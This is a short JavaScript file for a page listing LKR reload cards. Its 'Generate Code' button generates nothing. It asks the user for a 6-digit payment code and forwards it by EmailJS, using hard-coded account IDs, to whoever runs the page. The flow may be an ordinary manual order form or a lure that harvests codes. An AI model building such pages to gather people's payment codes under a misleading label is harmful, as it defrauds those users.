const cards = [{ name: "500 LKR" }, { name: "1000 LKR" }, { name: "2000 LKR" }];

function renderCards() {
    const list = document.getElementById('card-list');
    cards.forEach((card) => {
        const btn = document.createElement('button');
        btn.className = "card-btn";
        btn.innerText = card.name;
        btn.onclick = () => showGenerate(card.name);
        list.appendChild(btn);
    });
}

function showGenerate(name) {
    document.getElementById('dash-view').innerHTML = `
        <h3>${name} Selected</h3>
        <button class="card-btn" style="width:100%" onclick="finalStep('${name}')">Generate Code</button>
        <button class="card-btn" style="width:100%; margin-top:10px; background:transparent" onclick="location.reload()">Back</button>
    `;
}

function finalStep(name) {
    const code = prompt("Enter 6-digit payment code:");
    if (!code || code.length !== 6) return alert("Invalid code!");
    
    // EmailJS එක හරියටම දාන්න
    emailjs.send("service_ky2ympa", "template_5sac14q", {
        name: "User",
        card_name: name,
        payment_code: code
    }, "HahSYzYSEJF5oRsnt").then(() => {
        alert("Success! Request sent.");
        location.reload();
    });
}
